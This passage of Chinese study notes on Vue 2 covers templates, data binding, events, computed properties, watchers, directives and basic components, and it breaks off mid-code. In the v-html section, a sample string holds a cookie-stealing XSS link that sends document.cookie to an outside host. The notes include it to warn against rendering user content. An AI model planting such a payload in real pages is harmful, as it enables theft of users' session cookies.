# Vue核心

## 1.1 简介

- [英文官网](https://vuejs.org/)
- [中文官网](https://cn.vuejs.org/)

**动态构建用户界面的渐进式JavaScript框架**



### 1.1.1 Vue的特点

1. 遵循MVVM模式
2. 编码简洁，体积小，运行效率高，适合移动/PC端开发
3. 它本身只关注UI，可以引入其它第三方库开发项目
4. 借鉴 Angular 的模板和数据绑定技术
5. 借鉴 React 的组件化和虚拟DOM技术



### Vue周边库

- vue-cli：vue脚手架
- vue-resource
- axios
- vue-router：路由
- vuex：状态管理
- element-ui：基于vue的UI组件库（PC端）



## 1.2 初识Vue

### 开发环境部署

> 下载vue开发者工具

==Vue.js和Vue.js.min==

![image-20220415190927926](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415190927926.png)



==关闭生产提示==

![image-20220415192249965](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415192249965.png)





### 设置图标

==强制刷新==

shift+浏览器的刷新

**正常请求，如果没有就不在请求了。所以可能看不到一些找不到图标的报错**

![image-20220415193216281](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415193216281.png)



### Hello World

1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
2. **root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；**
3. ==root容器里的代码被称为【Vue模板】==；
4. **Vue实例和容器是一一对应的(不能一对多，也不能多对一)；**
5. 真实开发中只有一个Vue实例，并且会配合着组件一起使用；
6. **{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性**
7. 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新（MVVM）

![image-20220415200000276](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415200000276.png)



**注意区分：JS表达式和JS代码（语句）：**

1. 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方
   （1）a
   （2）a+b
   （3）demo(1)
   （4）x === y ‘a’ : ‘b’
2. js代码（语句）
   （1）if(){}
   （2）for(){}

> 表达式就是特殊的JS语句，能控制代码能否执行的就是JS语句



## 1.3 模板语法

概念： 容器里面的代码就是模板语法



模板语法分为两大类：

**差值语法：**

功能：用于解析标签体内容。

写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。



**指令语法：**

功能：用于解析标签（包括：标签属性、标签体内容、绑定事件...）

备注：Vue中有很多的指令，且形式都是：v-

举例：v-bind:hred="xxx" 或 简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性。

```
<a href="url"></a>   <!-- 此时的url只是一个字符串 -->
<a href={{url}}></a> <!-- 差值写在属性的写法已经被Vue弃用 -->

<a v-bind:href="url"></a>  <!-- 正确用法 -->
<a :href="url"></a>  <!-- 简写 -->
```

![image-20220415214101999](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415214101999.png)





## 1.4 数据绑定

Vue中有2种数据绑定的方式：

单向绑定（v-bind）：**数据只能从data流向页面。**

双向绑定（v-model）：**数据不仅能从data流向页面，还可以从页面流向data。**

备注：

**1.双向绑定一般都应用在表单元素上（如：input、select等）**

**2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。**

```html
<!-- 单向数据绑定 !-->
<input type="text" :value="name">
<!-- 双向数据绑定 !-->
<input type="text" v-model="name">
```

**错误示例：**
以下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上

```html
<h2 v-model:x="name">hello</h2> 
```

![image-20220415220349306](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415220349306.png)





### el和data的两种写法

el有2种写法：

（1）new Vue时候el属性；
（2）先创建Vue实例，随后再通过vm.$mount(’#root’)指定el的值



data有2种写法：

（1）对象式
（2）函数式
如何选择？目前哪种写法都可以，以后学到组件时，data必须使用函数式，否则会报错



一个重要的原则：

只要是Vue所管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了，而是window


![image-20220415221031629](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415221031629.png)



### MVVM

> **==vm就是vue的实例对象==**

**MVVM模型：**

M：模型(Model)：data中的数据

V：视图(View)：Vue模板

VM：视图模型(ViewModel)：Vue实例对象（绑定数据，dom监听）



**观察发现：**

data中所有的属性，最后都出现在了vm身上

vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接访问



![image-20220415225307787](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415225307787.png)

**我们来重点理解中间的视图模型（VM）**

中间的vm帮我们干了很多事，前端的框架都是这个套路

==把一堆乱七八糟的数据和一堆dom结构，vue呢在中间做了个连接，它就是中间一个桥梁一个纽带==

你把数据放在我要求放好的位置，然后你写出这种模板代码。模板里具体怎么插入值那你就要学习我的语法，像vue的插值语法啊，指令啊之类的。然后框架开始工作就可以将左边和右边的相互连接起来，并且还能给你承诺数据怎么变页面就怎么变



**代码理解**

![image-20220415224437900](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415224437900.png)





![image-20220415230556981](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415230556981.png)



我们也可以打印vm自带的变量或方法

![image-20220415230714129](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415230714129.png)





## 1.5 事件

### 事件处理

1. 使用 v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；

2. 事件的回调需要配置在methods对象中,最终会再vm上；

3. methods中配置的函数，不要用箭头函数！否则this就不是vm了而是window；

4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；

5. @click="demo" 和 @click="demo($event)" 效果一致，前者默认参数就是事件对象，后者要用$event才能生成事件对象，并且可以传多个参数；


备注：==method上面的方法最终也会出现在vm上面==，但它并没有作数据代理，因为没有必要，函数一旦定义好就直接拿来用。



测试给函数传参

![image-20220415232447168](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415232447168.png)





![image-20220415234027874](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220415234027874.png)



### 事件修饰符

> 事件冒泡就是事件一个接一个的发生

==prevent==

阻止默认事件（常用）

**本来弹窗完会跳转到百度（跳转到百度就属于默认事件），但是加上事件修饰符prevent的话弹完窗就不会跳到百度了**

```
<a href="http://www.baidu.com" @click.prevent="showInfo">点我跳转到百度</a>
```



==stop==

阻止事件冒泡（常用）

**触发完按钮的事件，又会触发div的事件。事件一个接一个的发生了这就叫事件冒泡**

**在单机事件后加上stop即可阻止事件冒泡**

```
<div class="demo1" @click="showInfo">
	<button @click.stop="showInfo">点我提示信息</button> <!-- 没加会触发外层事件，加了则不会 -->
</div>
```



==once==

事件只触发一次（常用）

**本来是点一次弹一次，加上once后只会弹一次**

```
<button @click.once="showInfo">点我弹窗</a>
```



captur

使用事件的捕获模式

**事件流** 分为 **捕获** 和 **冒泡**

![在这里插入图片描述](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/6c2cdec259794b0e901565e447f67986.png)

1. 当点击div2的时候先经过两个阶段：事件捕获=>事件冒泡，默认是事件冒泡处理事件；
2. 捕获阶段由外往内，冒泡阶段由内往外；





self

只有event.target是当前操作的元素时才触发事件

```html
<div class="box1" @click.capture="showMsg(1)">
    div1
    <div class="box2" @click="showMsg(2)">  <!-- 没加输出1,2，加了输出2,1 -->
        div2
    </div>
</div>
```



passive

先执行默认行为，后执行回调函数



### 键盘事件

**1.Vue中常用的按键别名：**

回车 => enter
删除 => delete（捕获“删除(delete)”和“退格(BackSpace)”键）
退出 => esc
空格 => space
换行 => tab（特殊，必须配合 keydown 去使用）
上 => up
下 => down
左 => left
右 => right



![image-20220416090552186](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416090552186.png)



其他的键盘事件类似

![image-20220416090828285](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416090828285.png)



**2.Vue未提供别名的案件，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）**



**3.系统修饰键（用法特殊）：ctrl、alt、shift、meta**
（1）配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其它键，事件才被触发。(此时的e.key值是其它键，而不是系统修饰键)
（2）配合keydown使用：正常触发事件。



### 事件总结

修饰符小技巧：事件修饰符可以连着写

```
<!-- 阻止默认事件和冒泡 -->
<div class="demo1" @click="showInfo">
	<a href="http://www.atguigu.com" @click.stop.prevent="showInfo">点我提示信息</a>
</div>


<!-- 按 ctrl + y 才触发（系统修饰符 + 键名） -->
<input type="text" placeholder="按下回车提示输入" @keyup.ctrl.y="showInfo">
```



## 1.6 计算属性

### 姓名案例

> 将数据展示到页面时要清楚，你模板里写的是指令还是插值
>
> Vue官方建议组件模板应该质包含简单的表达式，**复杂的表达式则应该重构为计算属性或方法**

**差值语法实现：**

```html
<div id="root">
	姓：<input type="text" v-model="firstName">
	名：<input type="text" v-model="lastName">
	姓名：<span>{{firstName.slice(0,3)}}-{{lastName}}</span>
</div>

<script>
    const vm = new Vue({
        el: '#root',
        data: { firstName: '张', lastName: '三' }
    })
</script>

```

**methods实现：**

```html
<div id="root">
    姓：<input type="text" v-model="firstName">
    名：<input type="text" v-model="lastName"> 
    姓名：<span>{{fullName()}}</span>
    <button @click="fullName">点我</button>
</div>

<script>
    const vm = new Vue({
        el: '#root',
        data: { firstName: '张', lastName: '三' },
        methods: {
            fullName() { return this.firstName + '-' + this.lastName } // this指向vm
        }
    })
</script>

```

- **注意methods方法在绑定事件的时候才可以省略小括号，在差值里不能**
- 只要data中的数据发生改变，Vue就会重新解析模板，只有重新解析模板才会拿到最新的值



**computed实现：**

```html
<div id="root">
    姓：<input type="text" v-model="firstName">  
    名：<input type="text" v-model="lastName"> 
    姓名：<span>{{fullName}}</span>
</div>

<script>
    const vm = new Vue({
        el: '#root',
        data: { firstName: '张', lastName: '三' },
        computed: {
            fullName: {
                get() {
                    // 此处的this是vm
                    return this.firstName + '-' + this.lastName
                }
            }
        }
    })
</script>

```





![image-20220416091736494](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416091736494.png)





![image-20220416092857906](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416092857906.png)





![image-20220416095552629](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416095552629.png)





### 计算属性

对于Vue来说，**data里的配置项就是属性 。**

而**计算属性，就是拿着写完的属性去加工计算，生成一个全新的属性。**

**计算属性直接被挂载到vm上，直接读取使用即可（_data里面没有计算属性）。**

```vue
const vm = new Vue({
    el: '#root',
    data: {
        firstName: '张',
        lastName: '三'
    },
    computed: {
        fullName: {
            get() {
             	// 此处的this是vm
                return this.firstName + '-' + this.lastName;
            }
        }
    }
})
```



==get什么作用？==
当有人读取fullName时，get就会被调用，且返回值就作为fullName的值。
（底层就是用Object.defineProperty的getter/setter实现的）



==get什么时候被调用？==

1.初次读取时会执行一次（往后就会取缓存里的数据）
2.**所依赖的数据发生变化时会被再次调用**（所以不用担心修改了值还会从缓存里获取）

```html
<!-- Vue模板里有4个fullName，为什么get只被调用了一次？ 
	 因为Vue底层为computed做了一个缓存机制，重复的计算属性会到缓存里面获取 -->
<div id="root">
	<span>{{fullName}}</span>
	<span>{{fullName}}</span>
	<span>{{fullName}}</span>
	<span>{{fullName}}</span>
</div>

<script>
    const vm = new Vue({
        el: '#root',
        data: {
            firstName: '张',
            lastName: '三'
        },
        computed: {
            fullName: {
                get() {
                	console.log('get被调用了'); // 只输出了一次 “get被调用了”
                    return this.firstName + '-' + this.lastName
                }
            }
        }
    })
</script>

```

**set什么时候被调用？**
当fullName被修改时。

如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生变化。

![image-20220416111434073](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416111434073.png)

```html
<!-- 当fullName被修改时页面并没有发生变化，原因是set并没有改到firstName和lastName，它只做了输出。
	 所以要想页面也发生变化，那就得给set做一个加工，让它修改到firstName和lastName。 -->
<script>
    const vm = new Vue({
        el: '#root',
        data: {
            firstName: '张',
            lastName: '三'
        },
        computed: {
            fullName: {
                get() {
                	console.log('get被调用了'); // 只输出了一次 “get被调用了”
                    return this.firstName + '-' + this.lastName
                },
                set(value) {
					console.log('set', value);
					// 格式：张-三
					const arr = value.split('-');
					this.firstName = arr[0];
					this.lastName = arr[1];
				}
            }
        }
    })
</script>

```



**computed对比methods：**

computed有缓存机制（复用），效率更高、调试方便（devtools上会有一个computed的分类）。

methods函数出现几次就调用几次，效率比较低。



### 计算属性简写

> 一般来说计算属性是不修改的，更多是读取出来展示。
>
> 并不是什么时候都能用简写，**只有考虑读取，不考虑修改**的时候才能用简写形式。

![image-20220416112041192](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416112041192.png)

![image-20220416111815272](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416111815272.png)



### 天气案例

![image-20220416113336974](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416113336974.png)



## 1.7 监视

**监视属性watch：**

1.当被监视的属性变化时，回调函数自动调用，进行相关操作；

2.监视的属性必须存在，才能进行监视！！（除了data属性，computed属性也能监视）

3.监视的两种写法：

（1）new Vue时传入watch配置；
（2）通过vm.$watch监视；

（明确要监视哪些属性的时候用第一个。创建实例的时候不知道要监视谁，后续根据用户的一些行为然后才知道要监视哪个属性就用第二个）



**watch配置属性：**

> immediate如果为true 代表如果在 wacth 里声明了之后，就会立即先去执行里面的handler方法

==immediate (立即的) 初始化时让handlder调用一下==



handler(newVal, oldVal)	当监视的属性发生改变的时候调用，参数可以拿到改变前后的值



deep	深度监听,可以监测多层级数据的改变



![image-20220416114015488](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416114015488.png)



![image-20220416114637534](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416114637534.png)

> 为什么配置项里的isHot不用加引号呢？

> 因为对象里的引号不用自己写，如果要用对象里的属性要加引号



![image-20220416115735324](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416115735324.png)







### 1.7.1 深度监视

1.Vue中的watch默认不监测对象内部值的变化（监测一层)

2.配置deep:true可以监测对象内部值变化（监测多层）



备注：
（1）Vue默认是可以监视到多层级数据的改变的（修改number.a页面发生改变可以看出）。但是watch属性默认是不可以的，要想可以就得打开深度监视（为了效率）。
（2）使用watch时根据数据的具体结果，决定是否采用深度监视。



![image-20220416120633590](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416120633590.png)

那么怎么才能监视上呢？

**在handler方法上面加上deep:true即可**



### 1.7.2 监视属性的简写

```js
const vm = new Vue({
    el: '#root',
    data: {
        isHot: true
    },
    computed: {
        info() {
            return this.isHot ? '炎热' : '凉爽';
        }
    },
    methods: {
        changeWeather() {
            this.isHot = !this.isHot
        }
    },
    watch: {
        // 正常写法:
        /* isHot: {
            // immediate: true,
            // deep:true,
            handler(newValue, oldValue) {
                console.log('isHot被修改了', newValue, oldValue);
            }
        }, */
        // 简写:
        isHot(newValue, oldValue) {
            console.log('isHot被修改了', newValue, oldValue);
        }
    }
});

// 正常写法：
vm.$watch('isHot', {
    // immediate: true,
    // deep:true,
    handler(newValue, oldValue) {
        console.log('isHot被修改了', newValue, oldValue);
    }
});

// 简写：
vm.$watch('isHot', function(newValue, oldValue) {
    console.log('isHot被修改了', newValue, oldValue);
});
```



### 1.7.3 watch对比computed

1.computed能完成的功能，watch都能完成。

2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。（点击按钮让a过一秒+1,）

两个重要的小原则：
1.所有被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。

2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数、Promise的回调函数等），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。



## 1.8 class与style绑定

class样式：

写法==:class="xxx"== xxx可以是字符串、对象、数组。

字符串写法适用于：类名不确定，要动态获取。

对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。

数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。



style样式：

:style="{fontSize: xxx}"其中xxx是动态值。（注意样式名得是小驼峰）

:style="[a,b]"其中a、b是样式对象。

```js
<div id="root">
    <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/>
    <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
    <div class="basic" :class="classArr">{{name}}</div> <br/>
    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
    <div class="basic" :class="classObj">{{name}}</div> <br/>
    
    <!-- 绑定style样式--对象写法 -->
    <div class="basic" :style="styleObj">{{name}}</div> <br/>
    <!-- 绑定style样式--数组写法 -->
    <div class="basic" :style="styleArr">{{name}}</div>
</div>

<script>
    const vm = new Vue({
        el: '#root',
        data: {
            name: '尚硅谷',
            mood: 'normal',
            classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
            classObj: {
                atguigu1: false,
                atguigu2: false
            },
            styleObj: {
                fontSize: '40px',
                color: 'red'
            },
            styleObj2: {
                backgroundColor: 'orange'
            },
            styleArr: [{
                fontSize: '40px',
                color: 'red'
            }, {
                backgroundColor: 'gray'
            }]

        },
        methods: {
            changeMood() {
                const arr = ['normal', 'happy', 'sad'];
                const index = Math.floor(Math.random() * 3);
                this.mood = arr[index];

            }
        },
    })
</script>

```



## 1.9 渲染

### 条件渲染

> ===     等值等类型

==v-if==

用来控制页面元素是否展示

写法：

```html
v-if="表达式"

v-else-if="表达式"

v-else="表达式"
```



适用于：**切换频率较低的场景。**

特点：**不展示的DOM元素直接被移除。**

注意：**v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。**

![image-20220416161333184](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416161333184.png)





==v-show==

写法：v-show=“表达式”

适用于：**切换频率较高的场景。**

特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉



==v-show底层指令其实就是调整display:none==

![image-20220416155725949](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416155725949.png)

==v-if和template==

1. 如果需要频繁切换 v-show 较好
2. 当条件不成立时, v-if 的所有子节点不会解析(项目中使用)**1.10. 列表渲染**



![image-20220416161855040](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220416161855040.png)







### 列表渲染

![image-20220420114134158](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420114134158.png)



==面试题：react、vue中的key有什么作用？（key的内部原理）==

	1. 虚拟DOM中key的作用：
	key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
	随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
	
	2.对比规则：
	(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
	①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
	②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
	
	(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
	创建新的真实DOM，随后渲染到到页面。
	
	3. 用index作为key可能会引发的问题：
	1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
	会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
	
	2. 如果结构中还包含输入类的DOM：
	会产生错误DOM更新 ==> 界面有问题。
	
	4. 开发中如何选择key?:
	1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
	2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
	使用index作为key是没有问题的。





## 1.10 过滤器

> ==immediate (立即的) 初始化时让handlder调用一下==

![image-20220420152945645](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420152945645.png)





## 1.11 收集表单数据

> 简单来说，JSON.stringify () 就是将值转换为相应的 JSON 格式字符串。
>
> ==v-model.trim用于去掉输入框内首尾空格==

```vue
<div id="root">
<!-- 绑定一个提交事件，并阻止默认行为。表单的默认行为就是把表单提交。不提交，只执行方法
方法就是在控制台打印我们表单的数据，并以json的形式在后台打印 -->
<form @submit.prevent="demo">
账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
密码：<input type="password" v-model="userInfo.password"> <br/><br/>
年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
<button>提交</button>
</form>
</div>

<script type="text/javascript">
Vue.config.productionTip = false

new Vue({
el:'#root',
data:{
userInfo:{
account:'',
password:'',
age:18,
}
},
methods: {
demo(){
console.log(JSON.stringify(this.userInfo))
}
}
})
</script>
```

![image-20220420163254761](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420163254761.png)



> ==v-model收集的是value值，且要给标签配置value值。==

![image-20220420171306857](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420171306857.png)





==总结==

**v-model的三个修饰符：**

lazy：失去焦点再收集数据

number：输入字符串转为有效的数字

trim：输入首尾空格过滤



## 1.12 内置指令

### v-text指令

1.作用：向其所在的节点中渲染文本内容。

2.与插值语法的区别：v-text会替换掉节点中的内容，{undefined{xx}}则不会。

```html
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-text="name"></div>
    <div v-text="str"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>'
        }
    })
</script>
```



![image-20220420171855727](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420171855727.png)





### v-html指令

**1.作用：向指定节点中渲染包含html结构的内容。**



2.与插值语法的区别：

v-html会替换掉节点中所有的内容，{{xx}}则不会。

==v-html可以识别html结构。==



3.严重注意：v-html有安全性问题！！！！

在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。

一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```html
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        }
    })
</script>
```



### v-once指令

- v-once所在节点在初次动态渲染后，就视为静态内容了。
- 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-once>初始化的n值是:{{ n }}</h2>
    <h2>当前的n值是:{{ n }}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

![image-20220420172717406](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420172717406.png)





## 1.13 生命周期

Vue 实例有⼀个完整的⽣命周期，也就是从new Vue()、初始化事件(.once事件)和生命周期、编译模版、挂载Dom -> 渲染、更新 -> 渲染、卸载 等⼀系列过程，称这是Vue的⽣命周期。



**回调函数**是你留个处理方法给事件，事件发生了以后会自动执行你留下调处理方法

**钩子函数**是好比找了个代理，监视事件是否发生，如果发生了这个代理就执行你的事件处理方法；在这个过程中，代理就是钩子函数

在某种意义上，回调函数做的处理过程跟钩子函数中要调用调方法一样
但是有一点： 钩子函数一般是由事件发生者提供的。直白了说，它留下一个钩子，这个钩子的作用就是钩住你的回调方法



> ==钩子函数是在一个事件触发的时候，在系统级捕获到了他，然后做一些操作。==一段用以处理系统消息的程序，用以处理系统消息的程序，是说钩子函数是用于处理系统消息的

![img](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/11370083-f279314aef6741db.jpg)







# 二、组件化编程

## 2.1 编写应用对比

### 传统方式编写应用

> 建议自行观看，讲的很清晰

![image-20220420182214465](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420182214465.png)



### 组件化方式编写应用

组件的思想，其实就封装。能很好的实现代码复用技术

代码复用是写一次处处用（**通过引用的方式**），代码复制是写一次复制一次

![image-20220420182727635](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420182727635.png)



### 组件的定义

**组件就是对UI结构的复用!**

![image-20220420195552167](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420195552167.png)







## 2.2 非单文件组件

> 非单文件组件就是一个html页面里有多个组件



**先来补充下template的功能**

### 2.2.1 template

> template用来定义html结构，其实``为模板字符串。它可以随意的换行

第一种情况，有 template：

如果 el 绑定的容器没有任何内容，就一个空壳子，但在 Vue 实例中写了 template，就会编译解析这个 template 里的内容，生成虚拟 DOM，最后将 虚拟 DOM 转为 真实 DOM 插入页面（**其实就可以理解为 template 替代了 el 绑定的容器的内容**）。

```js
    <div id="app">

    </div>
    <script>
        new Vue({
            el: '#app',
            template:`
            <div>
                <h2>当前的n值是:{{n}}</h2>
                <button @click="n++">点我n+1</button>
            </div>
            `,
            data: {
                n:'1'
            }
        })
    </script>
```





![image-20220420180011506](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420180011506.png)





**第二种情况，没有 template：**

没有 template，就编译解析 el 绑定的容器，生成虚拟 DOM，后面就顺着生命周期执行下去



### 2.2.2 基本使用

Vue中使用组件的三大步骤：

- 定义组件(创建组件)
- 注册组件
- 使用组件(写组件标签)



==定义组件==

使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；

区别如下：

el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。

**组件中定义的data必须写成函数，为什么？** ———— **避免组件被复用时，数据存在引用关系。**
讲解一下面试小问题：data必须写成函数：

这是 js 底层设计的原因：举个例子

> 对象形式

```js
let data = {
    a: 99,
    b: 100
}

let x = data;
let y = data;
// x 和 y 引用的都是同一个对象，修改 x 的值， y 的值也会改变
x.a = 66;
console.loh(x); // a:66 b:100
console.log(y); // a:66 b:100
```



> 函数形式
>
> 其中data可省略

```js
function data() {
    return {
        a: 99,
        b: 100
    }
}
let x = data();
let y = data();
console.log(x === y); // false
//函数每调用一次就创建一个新的对象返回给他们
```



> 备注：使用template可以配置组件结构。

创建一个组件案例：Vue.extend() 创建

```js
<script type="text/javascript">
    Vue.config.productionTip = false

    //第一步：创建school组件
    const school = Vue.extend({
        template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
    </div>
			`,
        // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
        data(){
            return {
                schoolName:'尚硅谷',
                address:'北京昌平'
            }
        },
        methods: {
            showName(){
                alert(this.schoolName)
            }
        },
    })

    //第一步：创建student组件
    const student = Vue.extend({
        template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
    </div>
			`,
        data(){
            return {
                studentName:'张三',
                age:18
            }
        }
    })

    //第一步：创建hello组件
    const hello = Vue.extend({
        template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
    </div>
			`,
        data(){
            return {
                name:'Tom'
            }
        }
    })
</script>

```



==注册组件==

- 局部注册：靠new Vue的时候传入components选项
- 全局注册：靠Vue.component(‘组件名’,组件)

> 局部注册

```js
<script>
	//创建vm
    new Vue({
        el: '#root',
        data: {
            msg:'你好啊！'
        },
        //第二步：注册组件（局部注册）
        components: {
            school: school,
            student: student
            // ES6简写形式
            // school,
            // student
        }
    })
</script>
```

> 全局注册

```js
<script>
	//第二步：全局注册组件
	Vue.component('hello', hello)
</script>
```



==写组件标签==

```html
<!-- 准备好一个容器-->
<div id="root">
    <hello></hello>
    <hr>
    <h1>{{msg}}</h1>
    <hr>
    <!-- 第三步：编写组件标签 -->
    <school></school>
    <hr>
    <!-- 第三步：编写组件标签 -->
    <student></student>
</div>
```



### 2.2.3 几个注意点

==关于组件名：==

一个单词组成：

- 第一种写法(首字母小写)：school
- 第二种写法(首字母大写)：School



==多个单词组成：==

- 第一种写法(kebab-case命名)：my-school
- 第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)



> 备注：
>
> (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
>
> (2).可以使用name配置项指定组件在开发者工具中呈现的名字。



==关于组件标签==

第一种写法：

第二种写法：

> 备注：不用使用脚手架时，会导致后续组件不能渲染。
>

一个简写方式：

**const school = Vue.extend(options) 可简写为：const school = options**





### 2.2.4 组件的嵌套

```js
<!-- 准备好一个容器-->
<div id="root">

</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    //定义student组件
    const student = Vue.extend({
        name:'student',
        template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
    </div>
			`,
        data(){
            return {
                name:'尚硅谷',
                age:18
            }
        }
    })

    //定义school组件
    const school = Vue.extend({
        name:'school',
        template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
    </div>
			`,
        data(){
            return {
                name:'尚硅谷',
                address:'北京'
            }
        },
        // 注册组件（局部）
        components:{
            student
        }
    })

    //定义hello组件
    const hello = Vue.extend({
        template:`<h1>{{msg}}</h1>`,
        data(){
            return {
                msg:'欢迎来到尚硅谷学习！'
            }
        }
    })

    //定义app组件
    const app = Vue.extend({
        template:`
				<div>	
					<hello></hello>
					<school></school>
    </div>
			`,
        components:{
            school,
            hello
        }
    })

    //创建vm
    new Vue({
        template:'<app></app>',
        el:'#root',
        //注册组件（局部）
